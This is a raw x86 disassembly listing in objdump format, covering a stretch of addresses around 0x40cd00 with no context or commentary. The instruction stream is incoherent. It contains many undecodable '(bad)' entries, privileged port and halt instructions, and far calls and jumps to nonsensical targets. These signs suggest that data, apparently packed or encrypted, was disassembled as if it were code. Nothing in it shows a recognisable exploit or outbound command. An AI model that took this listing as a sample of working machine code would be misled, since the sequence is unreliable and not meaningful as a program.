  40ccd6:	cmp    eax,0x83181b83
  40ccdb:	mov    cl,0x68
  40ccdd:	idiv   DWORD PTR [ebp-0x329808a7]
  40cce3:	int3   
  40cce4:	cmp    DWORD PTR [edx+ecx*8-0x28],edi
  40cce8:	pop    ecx
  40cce9:	adc    ecx,DWORD PTR [edx+0x28]
  40ccec:	fisttp QWORD PTR [edi+0x640a40e4]
  40ccf2:	repnz scas al,BYTE PTR es:[edi]
  40ccf4:	adc    DWORD PTR [eax],ecx
  40ccf6:	push   ds
  40ccf7:	out    dx,eax
  40ccf8:	add    DWORD PTR ds:0x5ed9d458,0x6083af9
  40cd02:	fsubr  QWORD PTR [edx-0x1f0ed2dd]
  40cd08:	xor    eax,0xcf558798
  40cd0d:	cs cmp eax,0xd4996d26
  40cd13:	sub    eax,0x20674e56
  40cd18:	popf   
  40cd19:	and    al,0x47
  40cd1b:	neg    ebx
  40cd1d:	cmp    BYTE PTR [ebp+0x672316f],bh
  40cd23:	push   cs
  40cd24:	pop    ss
  40cd25:	lock mov bl,BYTE PTR [ecx+0x2d5bf619]
  40cd2c:	inc    edx
  40cd2d:	fnstsw WORD PTR [ecx+0x30]
  40cd30:	push   0x134986c4
  40cd35:	inc    edx
  40cd36:	retf   0x5fc4
  40cd39:	and    eax,0xb2a22901
  40cd3e:	mov    bl,BYTE PTR [eax]
  40cd40:	ins    BYTE PTR es:[di],dx
  40cd42:	js     0x40cda9
  40cd44:	xor    esi,DWORD PTR [esi+0x7]
  40cd47:	sub    BYTE PTR [eax],al
  40cd49:	mov    ebp,DWORD PTR [edx]
  40cd4b:	jae    0x40ccea
  40cd4d:	imul   ecx,DWORD PTR [eax+0x29],0xffffffea
  40cd51:	cdq    
  40cd52:	test   al,0xde
  40cd54:	test   al,0x1a
  40cd56:	adc    al,0x0
  40cd58:	icebp  
  40cd59:	add    ch,dh
  40cd5b:	lock in al,0xe6
  40cd5e:	test   al,0xe5
  40cd60:	add    al,0x18
  40cd62:	xchg   BYTE PTR ds:0x208689be,dh
  40cd68:	or     BYTE PTR [edx+0x67],al
  40cd6b:	xor    dh,ch
  40cd6d:	mov    ah,0xb6
  40cd6f:	gs daa 
  40cd71:	loop   0x40cd97
  40cd73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd74:	xor    bl,BYTE PTR [edx-0x3f]
  40cd77:	push   edx
  40cd78:	push   ds
  40cd79:	lods   al,BYTE PTR ds:[esi]
  40cd7a:	push   es
  40cd7b:	or     dl,BYTE PTR [esi+0x610d1514]
  40cd81:	inc    esi
  40cd82:	sbb    ebp,DWORD PTR [ecx]
  40cd84:	fcomp  QWORD PTR [edx]
  40cd86:	xor    al,0x8
  40cd88:	or     dl,ah
  40cd8a:	adc    ah,BYTE PTR [edi+0x352d6f99]
  40cd90:	mov    ebx,0x98b1d8ce
  40cd95:	jo     0x40cd54
  40cd97:	and    al,0xe
  40cd99:	mov    edi,0xa408855f
  40cd9e:	fstp   DWORD PTR [eax-0x40]
  40cda1:	pop    ss
  40cda2:	and    BYTE PTR [ebp-0x50],dh
  40cda5:	lock xchg esp,eax
  40cda7:	mov    bh,0x37
  40cda9:	mov    bh,BYTE PTR [ecx-0x40df3bce]
  40cdaf:	xchg   ebx,eax
  40cdb0:	hlt    
  40cdb1:	call   0xc432:0xc44cdb87
  40cdb8:	in     eax,dx
  40cdb9:	mov    esp,0xc4bf2893
  40cdbe:	xchg   ebp,eax
  40cdbf:	sahf   
  40cdc0:	mul    DWORD PTR [ecx+0x8]
  40cdc3:	and    al,0xbc
  40cdc5:	sub    eax,0xf14e80a9
  40cdca:	mov    esi,0x200e5660
  40cdcf:	sub    BYTE PTR [esi-0x71],bl
  40cdd2:	jne    0x40cd81
  40cdd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd5:	das    
  40cdd6:	mov    DWORD PTR [ebp+0x2abaf486],ecx
  40cddc:	jns    0x40cdb1
  40cdde:	push   es
  40cddf:	xor    al,0x5f
  40cde1:	and    bl,bh
  40cde3:	sub    BYTE PTR [ecx-0x850e0d7],ah
  40cde9:	pop    ecx
  40cdea:	inc    edi
  40cdeb:	sub    dh,BYTE PTR [ecx+0x6b]
  40cdee:	adc    dh,BYTE PTR [edx+0x3e]
  40cdf1:	lock pusha 
  40cdf3:	js     0x40ce1d
  40cdf5:	fadd   st,st(3)
  40cdf7:	sub    eax,0xd82f41fe
  40cdfc:	add    esp,DWORD PTR [edi]
  40cdfe:	xchg   BYTE PTR [edi-0xf],bl
  40ce01:	retf   
  40ce02:	int    0xc6
  40ce04:	pop    es
  40ce05:	adc    BYTE PTR [esi-0x61f495d7],cl
  40ce0b:	or     BYTE PTR cs:[esi-0x4b2e26e6],al
  40ce12:	adc    al,0x15
  40ce14:	jmp    0x40ce56
  40ce16:	or     cl,ah
  40ce18:	cmc    
  40ce19:	lock shl bl,0x61
  40ce1d:	cmp    BYTE PTR [ecx-0x65],0xdf
  40ce21:	(bad)  
  40ce22:	int    0x8f
  40ce24:	cwde   
  40ce25:	dec    ecx
  40ce26:	xchg   BYTE PTR ds:0xafb0fca,al
  40ce2c:	repz push ebx
  40ce2e:	pop    esi
  40ce2f:	adc    DWORD PTR [edx-0x4c],ebx
  40ce32:	jl     0x40ce5c
  40ce34:	xchg   ebp,eax
  40ce35:	in     al,0x7a
  40ce37:	sub    esp,DWORD PTR [esi+0x62]
  40ce3a:	xchg   edi,ebp
  40ce3c:	mov    bh,0xf3
  40ce3e:	mov    eax,ds:0x2f0d89e1
  40ce43:	sub    BYTE PTR [edx+esi*2],bh
  40ce46:	sub    al,0xc6
  40ce48:	or     BYTE PTR [esi-0x4d33ad5f],bl
  40ce4e:	dec    eax
  40ce4f:	mov    eax,0xb7d2f762
  40ce54:	xor    eax,0xb8baaf92
  40ce59:	xlat   BYTE PTR ds:[ebx]
  40ce5a:	xlat   BYTE PTR ds:[ebx]
  40ce5b:	push   eax
  40ce5c:	neg    DWORD PTR [ebp-0x36acec3d]
  40ce62:	and    dl,BYTE PTR [esi+0x57]
  40ce65:	icebp  
  40ce66:	into   
  40ce67:	xchg   ebx,eax
  40ce68:	add    DWORD PTR [ebx+0x459dcb91],eax
  40ce6e:	dec    BYTE PTR [esi+0x3d87edd9]
  40ce74:	sub    dl,BYTE PTR [eax-0x58]
  40ce77:	call   0x280a:0x35a81cbf
  40ce7e:	mov    al,0x5d
  40ce80:	cmp    DWORD PTR [ecx-0x73],0x6fff7db
  40ce87:	jns    0x40cec9
  40ce89:	push   cs
  40ce8a:	into   
  40ce8b:	jbe    0x40ce0e
  40ce8d:	inc    eax
  40ce8f:	adc    al,0x29
  40ce91:	adc    al,BYTE PTR [eax-0x3e]
  40ce94:	stc    
  40ce95:	fwait
  40ce96:	mov    cl,BYTE PTR [ecx]
  40ce98:	or     DWORD PTR [eax-0x6d],edx
  40ce9b:	mov    cl,0xf3
  40ce9d:	sub    eax,0xf12f7622
  40cea2:	shl    BYTE PTR [esi+0xb09fca1],1
  40cea8:	sbb    DWORD PTR [edi+ebp*1],edx
  40ceab:	inc    eax
  40ceac:	xor    dl,bh
  40ceae:	xchg   DWORD PTR [ecx],ecx
  40ceb0:	add    BYTE PTR [eax-0x66],bl
  40ceb3:	push   ebp
  40ceb4:	and    DWORD PTR [edi+edi*8+0x29],esp
  40ceb8:	je     0x40cf32
  40ceba:	jb     0x40cf0d
  40cebc:	or     BYTE PTR [edx],ch
  40cebe:	jle    0x40ce62
  40cec0:	or     esi,0x70
  40cec3:	sbb    edx,eax
  40cec5:	icebp  
  40cec6:	stos   BYTE PTR es:[edi],al
  40cec7:	imul   esi,DWORD PTR [edx-0x62dbfa9f],0xffffffd1
  40cece:	jmp    0x40cf38
  40ced0:	pop    ss
  40ced1:	and    BYTE PTR [edi+0x33e3e5db],al
  40ced7:	adc    DWORD PTR [ecx-0x65],edi
  40ceda:	ds sub dh,ch
  40cedd:	daa    
  40cede:	das    
  40cedf:	test   BYTE PTR [ecx],ah
  40cee1:	imul   esi,DWORD PTR [ecx-0x30],0x3d86d100
  40cee8:	fwait
  40cee9:	imul   dl
  40ceeb:	jl     0x40cf51
  40ceed:	and    BYTE PTR [ebx],ah
  40ceef:	cdq    
  40cef0:	mov    dh,0x8b
  40cef2:	xchg   DWORD PTR [edi],ecx
  40cef4:	(bad)  
  40cef6:	scas   eax,DWORD PTR es:[edi]
  40cef7:	stos   DWORD PTR es:[edi],eax
  40cef8:	jmp    0x40cf4b
  40cefa:	xchg   ebp,edi
  40cefc:	pop    ss
  40cefd:	scas   al,BYTE PTR es:[edi]
  40cefe:	sub    edx,ebp
  40cf00:	and    esp,DWORD PTR [ebp+0x1d]
  40cf03:	sub    BYTE PTR [ecx],al
  40cf05:	add    eax,ebp
  40cf07:	mov    ?,WORD PTR [ebx]
  40cf09:	cmp    al,0x91
  40cf0b:	ror    DWORD PTR [ecx],0xb3
  40cf0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf0f:	mov    ds:0xb9799b97,eax
  40cf14:	pop    ebx
  40cf15:	adc    al,0x4d
  40cf17:	sub    BYTE PTR [edi+0x1f],dh
  40cf1a:	ret    
  40cf1b:	and    ecx,DWORD PTR [eax]
  40cf1d:	jl     0x40cf4a
  40cf1f:	push   ecx
  40cf20:	or     al,0x37
  40cf22:	xor    eax,0x92cbb763
  40cf27:	rcl    DWORD PTR [ebx-0x456c1e8f],cl
  40cf2d:	imul   esp,DWORD PTR [ebx+0x1b],0xe4e295ec
  40cf34:	mov    ebp,0x495386ba
  40cf39:	call   0x3420:0xec79799e
  40cf40:	enter  0xbe7c,0xd
  40cf44:	les    esp,FWORD PTR ds:0xfd496133
  40cf4a:	xchg   ecx,ebx
  40cf4c:	repnz aas 
  40cf4e:	inc    eax
  40cf4f:	sti    
  40cf50:	addr16 pop eax
  40cf52:	add    al,0x27
  40cf54:	lahf   
  40cf55:	lock loop 0x40cf65
  40cf58:	mov    eax,0xc287dc4c
  40cf5d:	sbb    esp,DWORD PTR [ebx-0x787d1ff7]
  40cf63:	shr    DWORD PTR [edi+0xd3b74f1],1
  40cf69:	mov    ecx,0x4f2b78c5
  40cf6e:	inc    ecx
  40cf6f:	or     DWORD PTR [ecx],ecx
  40cf71:	(bad)  
  40cf72:	ja     0x40cf4b
  40cf74:	in     al,dx
  40cf75:	cmp    eax,0xf02efe07
  40cf7a:	fcomp  QWORD PTR [esi-0x7e9bf0a0]
  40cf80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf81:	mov    ecx,0xf207e668
  40cf86:	xchg   BYTE PTR [edi-0x61040efd],ch
  40cf8c:	int    0xd6
  40cf8e:	ss daa 
  40cf90:	dec    ebp
  40cf91:	adc    BYTE PTR [edx-0x3219745b],ch
  40cf97:	cli    
  40cf98:	lea    eax,[eax-0x57829a05]
  40cf9e:	stos   DWORD PTR es:[edi],eax
  40cf9f:	rcr    BYTE PTR [esi-0x14],1
  40cfa2:	or     esp,DWORD PTR [edi]
  40cfa4:	dec    ecx
  40cfa5:	and    BYTE PTR [esi-0x68],al
  40cfa8:	(bad)  
  40cfa9:	lock les esp,FWORD PTR [ebx]
  40cfac:	int    0x90
  40cfae:	scas   al,BYTE PTR es:[edi]
  40cfaf:	dec    edi
  40cfb0:	jle    0x40cfbc
  40cfb2:	pushf  
  40cfb3:	adc    esi,DWORD PTR [edx-0x1bee79f2]
  40cfb9:	in     eax,dx
  40cfba:	adc    cl,BYTE PTR [edi]
  40cfbc:	xlat   BYTE PTR ds:[ebx]
  40cfbd:	rol    DWORD PTR [eax+ebp*1],0xab
  40cfc1:	jnp    0x40d025
  40cfc3:	inc    edi
  40cfc4:	div    DWORD PTR [ebx+0x58]
  40cfc7:	das    
  40cfc8:	mov    ds:0x8176f9f5,al
  40cfcd:	sbb    ebx,ebx
  40cfcf:	jmp    0x40cffe
  40cfd1:	push   ds
  40cfd2:	mov    edi,0x53050935
  40cfd7:	clc    
  40cfd8:	jb     0x40cf99
  40cfda:	xor    DWORD PTR [ebp+0x31877d36],ebx
  40cfe0:	and    BYTE PTR ds:0x8259038,0xf4
  40cfe7:	adc    ch,BYTE PTR [edx+0x6128e066]
  40cfed:	sub    al,0x2c
  40cfef:	mov    eax,0xf38768ae
  40cff4:	push   edi
  40cff5:	sbb    DWORD PTR [edi+esi*1],0x29a22817
  40cffc:	fcmovu st,st(4)
  40cffe:	xor    edi,edi
  40d000:	or     DWORD PTR [eax-0x3e],eax
  40d003:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d004:	add    ebp,DWORD PTR [edx]
  40d006:	lods   al,BYTE PTR ds:[esi]
  40d007:	aad    0xcc
  40d009:	lock mov esp,0x81a265ce
  40d00f:	pxor   mm3,mm7
  40d012:	sub    esi,eax
  40d014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d015:	cmc    
  40d016:	xchg   ecx,eax
  40d017:	cdq    
  40d018:	fldcw  WORD PTR [edx+eax*8]
  40d01b:	sub    ebp,DWORD PTR [eax+0x1b7550f]
  40d021:	mov    ecx,0x28121bf2
  40d026:	or     DWORD PTR [eax-0x135a0ffb],eax
  40d02c:	sbb    eax,0x9dbdb2ac
  40d031:	jmp    0x209af919
  40d036:	ror    BYTE PTR [edi],0x71
  40d039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d03a:	cmp    al,0xd6
  40d03c:	push   eax
  40d03d:	xchg   esi,eax
  40d03e:	out    0x29,eax
  40d040:	sub    bl,BYTE PTR [esi-0xf]
  40d043:	jmp    0x34b1:0x2e0be787
  40d04a:	aam    0xfe
  40d04c:	test   dh,bh
  40d04e:	xchg   BYTE PTR [esi],ch
  40d050:	adc    cl,0x87
  40d053:	imul   eax,DWORD PTR [edi],0xffffffcd
  40d056:	(bad)  
  40d057:	popf   
  40d058:	cs lock mov dh,0xc1
  40d05c:	pop    ds
  40d05d:	imul   esp,DWORD PTR [esi],0xffffffde
  40d060:	aaa    
  40d061:	cmc    
  40d062:	mov    al,ds:0x87abe960
  40d067:	pop    ds
  40d068:	les    ecx,FWORD PTR [esi-0x6d]
  40d06b:	inc    ecx
  40d06c:	mov    cl,0x3a
  40d06e:	inc    eax
  40d06f:	sub    BYTE PTR [esi+eax*1+0x460826bc],bl
  40d076:	jmp    0xdefd0ad9
  40d07b:	aas    
  40d07c:	outs   dx,BYTE PTR ds:[esi]
  40d07d:	icebp  
  40d07e:	ins    BYTE PTR es:[edi],dx
  40d07f:	add    al,0xf5
  40d081:	cmc    
  40d082:	xor    DWORD PTR [edx+0x6fb8dd29],0x3d864c86
  40d08c:	pop    ds
  40d08d:	jno    0x40d0e5
  40d08f:	les    ebx,FWORD PTR [ecx]
  40d091:	les    ebp,FWORD PTR [edi+0x28]
  40d094:	clc    
  40d095:	pop    edx
  40d096:	les    esp,FWORD PTR [edi+esi*8]
  40d099:	sub    ebp,ebx
  40d09b:	push   esi
  40d09c:	mov    WORD PTR [edi-0x44],?
  40d09f:	inc    esi
  40d0a0:	xchg   DWORD PTR [edx+ebp*8-0x50f16fe],ecx
  40d0a7:	into   
  40d0a8:	push   0xffffff87
  40d0aa:	(bad)  
  40d0ab:	dec    ecx
  40d0ac:	loope  0x40d030
  40d0ae:	push   eax
  40d0af:	pop    esp
  40d0b0:	cs push 0x6dc19386
  40d0b6:	xchg   edx,eax
  40d0b7:	jg     0x40d0ca
  40d0b9:	mov    BYTE PTR ds:[ecx+ebp*8],cl
  40d0bd:	in     al,dx
  40d0be:	mov    WORD PTR [ecx],gs
  40d0c0:	mov    al,ds:0xfc1197c3
  40d0c5:	inc    esp
  40d0c6:	test   DWORD PTR [ebp-0x1],esp
  40d0c9:	and    al,ch
  40d0cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0cc:	sbb    DWORD PTR ds:0xca85ea2f,0x0
  40d0d3:	sub    DWORD PTR [eax+0x2cfef30],edx
  40d0d9:	xor    bh,BYTE PTR [edx]
  40d0db:	cli    
  40d0dc:	gs jne 0x40d159
  40d0df:	push   eax
  40d0e0:	inc    edx
  40d0e1:	dec    esi
  40d0e2:	xchg   DWORD PTR [ecx],edi
  40d0e4:	dec    ebp
  40d0e5:	imul   edx
  40d0e7:	mov    bh,0x28
  40d0ea:	inc    ebx
  40d0eb:	mov    bh,0xe5
  40d0ed:	and    al,0x2b
  40d0ef:	test   eax,0x9a7ad608
  40d0f4:	inc    eax
  40d0f5:	sbb    al,0x11
  40d0f7:	xor    eax,0x9d8e07d2
  40d0fc:	jmp    0x216bf0f3
  40d101:	dec    esi
  40d102:	jnp    0x40d091
  40d104:	jg     0x40d177
  40d106:	icebp  
  40d107:	mov    DWORD PTR [ecx-0xf],ebp
  40d10a:	inc    DWORD PTR [edi-0x5d]
  40d10d:	in     al,0xc8
  40d10f:	xchg   ebx,eax
  40d110:	aam    0xf5
  40d112:	dec    edx
  40d113:	adc    BYTE PTR ds:0x779c9223,ah
  40d119:	mov    cl,0x8c
  40d11b:	sbb    eax,0x9fcba20e
  40d120:	(bad)  [ebx+0x514839bf]
  40d126:	(bad)  
  40d127:	sub    ebp,eax
  40d129:	cmp    al,0xdb
  40d12b:	sub    DWORD PTR [edx+esi*1+0x2e06bdad],esi
  40d132:	mov    eax,ds:0x30704393
  40d137:	ror    dh,0xa7
  40d13a:	push   0xba73ab9a
  40d13f:	mov    edx,0x5a6ece65
  40d144:	ret    0xb770
  40d147:	cmp    bh,bh
  40d149:	ss jb  0x40d1bd
  40d14c:	aad    0x21
  40d14e:	in     eax,dx
  40d14f:	js     0x40d159
  40d151:	mov    BYTE PTR [ebx],0x64
  40d154:	pop    ebp
  40d155:	jb     0x40d0ec
  40d157:	rol    DWORD PTR [ecx],cl
  40d159:	lock adc BYTE PTR [esp+eax*1-0x1],dh
  40d15e:	mov    ?,WORD PTR [ecx]
  40d160:	jge    0x40d140
  40d162:	dec    ecx
  40d163:	aad    0x7e
  40d165:	test   DWORD PTR [esi+0x6d3a3eb9],0xb4b86f49
  40d16f:	sub    al,bh
  40d171:	test   eax,0x522f6f77
  40d176:	mov    ebx,0x8723bed1
  40d17b:	jne    0x40d1f1
  40d17d:	ror    BYTE PTR [esi+0x4e],cl
  40d180:	(bad)  
  40d181:	(bad)  
  40d182:	pop    edi
  40d183:	sub    BYTE PTR [esi],cl
  40d185:	fadd   st(3),st
  40d187:	cmc    
  40d188:	push   es
  40d189:	lods   al,BYTE PTR ds:[esi]
  40d18a:	ins    DWORD PTR es:[edi],dx
  40d18b:	jle    0x40d148
  40d18d:	out    dx,al
  40d18e:	ret    0x34d0
  40d191:	xor    BYTE PTR [ebx+0x74efa120],ah
  40d197:	in     al,dx
  40d198:	stc    
  40d199:	stos   BYTE PTR es:[edi],al
  40d19a:	in     eax,dx
  40d19b:	push   eax
  40d19c:	out    dx,eax
  40d19d:	sbb    bh,al
  40d19f:	adc    bh,dh
  40d1a1:	sbb    esi,DWORD PTR [edx+0x4c]
  40d1a4:	adc    BYTE PTR [edx+0x22],0xee
  40d1a8:	xchg   edx,eax
  40d1a9:	icebp  
  40d1aa:	and    ebp,DWORD PTR cs:[edi]
  40d1ad:	jae    0x40d13e
  40d1af:	xor    cl,BYTE PTR [edi-0x3c]
  40d1b2:	es add ecx,ebx
  40d1b5:	cmp    al,0xa8
  40d1b7:	xchg   ebp,eax
  40d1b8:	test   eax,0xf26f83cc
  40d1bd:	cmp    DWORD PTR [ebp+0x3c],0xffffff95
  40d1c1:	test   eax,0xd377b989
  40d1c6:	inc    esi
  40d1c7:	add    edx,DWORD PTR [eax-0x10]
  40d1ca:	mov    dh,0xcd
  40d1cc:	pushf  
  40d1cd:	mov    BYTE PTR [ecx+0x31edd093],ch
  40d1d3:	jl     0x40d253
  40d1d5:	inc    esp
  40d1d6:	xchg   BYTE PTR ds:0xa8477a62,dl
  40d1dc:	ins    DWORD PTR es:[edi],dx
  40d1dd:	imul   DWORD PTR [edx]
  40d1df:	and    BYTE PTR [eax-0x3990c8f],al
  40d1e5:	dec    ebp
  40d1e6:	inc    esp
  40d1e7:	and    al,0xf3
  40d1e9:	sbb    BYTE PTR [esi+0x167e6359],al
  40d1ef:	jbe    0x40d210
  40d1f1:	jno    0x40d271
  40d1f3:	sub    BYTE PTR [ebx-0x48],ch
  40d1f6:	jns    0x40d240
  40d1f8:	loopne 0x40d1ac
  40d1fa:	mov    eax,0xcb9968e2
  40d1ff:	and    DWORD PTR [edi],edi
  40d201:	pop    eax
  40d202:	xchg   BYTE PTR [edi],ch
  40d204:	pop    ebx
  40d205:	repz or BYTE PTR [ecx],dh
  40d208:	pop    ebp
  40d209:	sbb    al,0x46
  40d20b:	or     al,0x7d
  40d20d:	aaa    
  40d20e:	pop    ebp
  40d20f:	outs   dx,DWORD PTR ds:[esi]
  40d210:	bound  ebp,QWORD PTR [edi]
  40d212:	inc    esi
  40d213:	jb     0x40d222
  40d215:	adc    DWORD PTR [eax+0xd87f41],0x29
  40d21c:	mov    esp,0x808e884
  40d221:	push   ds
  40d222:	cdq    
  40d223:	int3   
  40d224:	sar    BYTE PTR [esi],0x54
  40d227:	mov    eax,0x8ed7e97
  40d22c:	or     BYTE PTR [eax+0x18],bl
  40d22f:	cmp    ah,cl
  40d231:	enter  0xee4c,0xfc
  40d235:	icebp  
  40d236:	nop
  40d237:	mov    ds:0xb5d3a1bc,al
  40d23c:	(bad)  
  40d23d:	adc    esp,esp
  40d23f:	xor    eax,0x2b8603b3
  40d244:	pop    ebp
  40d245:	mov    ecx,0xdd9b72f3
  40d24a:	inc    esp
  40d24b:	sub    BYTE PTR [ecx+0x9e50dbf],cl
  40d251:	push   0xfffffffb
  40d253:	jbe    0x40d282
  40d255:	xchg   ebx,eax
  40d257:	out    0x68,eax
  40d259:	fiadd  WORD PTR [edx+0x6e06ddb]
  40d25f:	pop    edi
  40d260:	out    dx,eax
  40d261:	(bad)  
  40d262:	xchg   ch,ah
  40d264:	mov    edx,0x373b68b4
  40d269:	jmp    0x25afd5f5
  40d26e:	mov    BYTE PTR [edx+0x3a79f47f],ch
  40d274:	or     BYTE PTR [edx-0x9],bl
  40d277:	adc    cl,BYTE PTR [ebp-0x34bc5528]
  40d27d:	push   edi
  40d27e:	xchg   edi,ebx
  40d280:	mov    esi,0x8bd741fd
  40d285:	sbb    BYTE PTR ds:0x5d5fdc29,dl
  40d28b:	test   BYTE PTR [ecx],0x3a
  40d28e:	ins    DWORD PTR es:[edi],dx
  40d28f:	imul   ch
  40d291:	ret    
  40d292:	jmp    0x40d2b4
  40d294:	xor    eax,0x58f10cf1
  40d299:	call   0x6966:0x867ceb3d
  40d2a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2a1:	bound  eax,QWORD PTR [esi+0x88e54b9]
  40d2a7:	jbe    0x40d246
  40d2a9:	lods   eax,DWORD PTR ds:[esi]
  40d2aa:	mov    edi,0x85635b28
  40d2af:	in     al,0x8
  40d2b1:	loopne 0x40d325
  40d2b3:	mov    ah,0xc0
  40d2b5:	pushf  
  40d2b6:	out    dx,eax
  40d2b7:	fbstp  TBYTE PTR [ecx+0xcfc0e6]
  40d2bd:	out    dx,al
  40d2be:	mov    ds:0x9912c803,al
  40d2c3:	ss xchg edi,eax
  40d2c5:	sbb    eax,0x2b11c6a5
  40d2ca:	xchg   BYTE PTR [ecx+0x30],bl
  40d2cd:	leave  
  40d2ce:	ficomp WORD PTR [ebx+eiz*2-0x48c9ec18]
  40d2d5:	icebp  
  40d2d6:	mov    ch,0x63
  40d2d8:	add    al,BYTE PTR [ebx-0x55]
  40d2db:	or     DWORD PTR [ecx+eiz*1-0x65],ebp
  40d2df:	aas    
  40d2e0:	std    
  40d2e1:	pop    esp
  40d2e2:	dec    esi
  40d2e3:	jmp    0xe461c3c2
  40d2e8:	mov    eax,ds:0x46630b67
  40d2ed:	sbb    al,0x14
  40d2ef:	inc    esp
  40d2f0:	cmp    DWORD PTR [ecx-0x46],esp
  40d2f3:	imul   edx,DWORD PTR [ecx+eiz*4+0x7],0x30ecba61
  40d2fb:	das    
  40d2fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2fd:	mov    al,0xf5
  40d2ff:	fmul   DWORD PTR [ecx-0x78]
  40d302:	inc    edi
  40d303:	dec    esp
  40d304:	lar    eax,WORD PTR [edi]
  40d307:	aad    0xb1
  40d309:	mov    al,0x3a
  40d30b:	(bad)
  40d30e:	call   FWORD PTR [ecx]
  40d310:	mov    DWORD PTR [esi+0x25],0xd82e0329
  40d317:	pop    edx
  40d318:	or     DWORD PTR [edx],esp
  40d31a:	or     DWORD PTR [ebx+0x3dd57da8],ecx
  40d320:	ja     0x40d313
  40d322:	test   al,0x34
  40d324:	pop    ss
  40d325:	shr    eax,cl
  40d327:	data16 jnp 0x40d2d2
  40d32a:	push   ss
  40d32b:	stc    
  40d32c:	into   
  40d32d:	dec    ecx
  40d32e:	inc    edi
  40d32f:	(bad)  
  40d330:	lock push eax
  40d332:	cli    
  40d333:	push   ebp
  40d334:	outs   dx,BYTE PTR ds:[esi]
  40d335:	push   ds
  40d336:	mov    esp,0x6319ccd
  40d33b:	loopne 0x40d2c2
  40d33d:	icebp  
  40d33e:	adc    al,0xe4
  40d340:	xchg   BYTE PTR [edx],al
  40d342:	push   ebx
  40d343:	repz shr DWORD PTR [ebx+0x6d],1
  40d347:	xor    al,0x1a
  40d349:	aaa    
  40d34a:	xchg   DWORD PTR [ebx],ebp
  40d34c:	sahf   
  40d34d:	outs   dx,BYTE PTR ds:[esi]
  40d34e:	mov    edi,0xb3613d2e
  40d353:	pop    ecx
  40d354:	bound  ebp,QWORD PTR [edi-0x6477e380]
  40d35a:	(bad)  
  40d35b:	hlt    
  40d35c:	adc    al,0xde
  40d35e:	outs   dx,DWORD PTR ds:[esi]
  40d35f:	stos   DWORD PTR es:[edi],eax
  40d360:	push   ebp
  40d361:	into   
  40d362:	jmp    0x8732fc53
  40d367:	push   ss
  40d368:	repz in eax,dx
  40d36a:	mov    dh,0x3a
  40d36c:	xchg   DWORD PTR [edx],edx
  40d36e:	ret    
  40d36f:	loopne 0x40d2ff
  40d371:	pop    ebx
  40d372:	inc    edi
  40d373:	pop    edi
  40d374:	or     esp,edi
  40d376:	ins    DWORD PTR es:[edi],dx
  40d377:	(bad)  
  40d378:	rol    dl,cl
  40d37a:	jnp    0x40d34b
  40d37c:	iret   
  40d37d:	or     edi,ebx
  40d37f:	mov    eax,0x299bcf9d
  40d384:	pop    esp
  40d385:	sub    DWORD PTR [eax],esp
  40d387:	cwde   
  40d388:	or     DWORD PTR [esi+0x59],eax
  40d38b:	test   esp,ebx
  40d38d:	xor    eax,0xe399d516
  40d392:	hlt    
  40d393:	in     eax,0x3
  40d395:	sub    al,0x65
  40d397:	push   0x16
  40d399:	dec    eax
  40d39a:	xchg   DWORD PTR [eax+0x8],esi
  40d39d:	mov    dh,0xbe
  40d39f:	mov    ebp,0x97863ad
  40d3a4:	mov    bl,0xf1
  40d3a6:	out    0xa1,al
  40d3a8:	xor    DWORD PTR [ecx-0x770da53f],esi
  40d3ae:	cmp    BYTE PTR [edx],0xd1
  40d3b1:	add    BYTE PTR [ebp+ebx*2-0x74240278],0xc1
  40d3b9:	add    bl,BYTE PTR [esi]
  40d3bb:	xchg   BYTE PTR [ecx+0x0],al
  40d3be:	jne    0x40d3e8
  40d3c0:	jle    0x40d382
  40d3c2:	dec    edx
  40d3c3:	add    DWORD PTR [edx],ecx
  40d3c5:	or     al,0xb3
  40d3c7:	test   DWORD PTR [ebx+0x5c],edi
  40d3ca:	leave  
  40d3cb:	or     esi,DWORD PTR [edi]
  40d3cd:	fcom   QWORD PTR [eax+0x6a]
  40d3d0:	inc    esp
  40d3d1:	loop   0x40d445
  40d3d3:	leave  
  40d3d4:	jmp    0x8475:0xb4a278ba
  40d3db:	pop    edi
  40d3dc:	out    0x8a,al
  40d3de:	cmp    ecx,ebp
  40d3e0:	pop    ss
  40d3e1:	pop    esi
  40d3e2:	xchg   BYTE PTR ds:0x31a46cdb,ch
  40d3e8:	pop    ecx
  40d3e9:	fstp   DWORD PTR [ebp-0x2bf792e9]
  40d3ef:	sub    DWORD PTR [eax+0x4b],ecx
  40d3f2:	hlt    
  40d3f3:	scas   al,BYTE PTR es:[edi]
  40d3f4:	cmp    al,0x11
  40d3f6:	sbb    ebx,0xa88f26ba
  40d3fc:	jmp    0x75e8c8b2
  40d401:	sbb    DWORD PTR ds:0x3d58ff4b,edx
  40d407:	sub    cl,bh
  40d409:	pop    es
  40d40a:	add    esi,edi
  40d40c:	or     DWORD PTR [esi],ecx
  40d40e:	lea    eax,[esi+0x651d22b7]
  40d414:	in     eax,dx
  40d415:	icebp  
  40d416:	inc    esp
  40d417:	mov    eax,eax
  40d419:	xchg   BYTE PTR [eax],ah
  40d41b:	sahf   
  40d41c:	ret    
  40d41d:	jle    0x40d42a
  40d41f:	es sub eax,0x14dbd987
  40d426:	xor    al,0xc8
  40d428:	and    ecx,DWORD PTR [ecx+0xb5d288a]
  40d42e:	outs   dx,DWORD PTR ds:[esi]
  40d42f:	mov    al,ds:0x32d49188
  40d434:	ret    
  40d435:	mov    al,0x2c
  40d437:	mov    al,0xcf
  40d439:	out    dx,al
  40d43a:	mov    edx,0xca415436
  40d43f:	iret   
  40d440:	pavgw  mm0,QWORD PTR [esi+0xe]
  40d444:	jge    0x40d3ca
  40d446:	fld    DWORD PTR [edx+eax*2+0x2b27ba35]
  40d44d:	les    ecx,FWORD PTR [edi]
  40d44f:	idiv   DWORD PTR fs:[ecx]
  40d452:	imul   ebp,DWORD PTR [ecx-0x28c10f68],0x2b
  40d459:	add    ah,bh
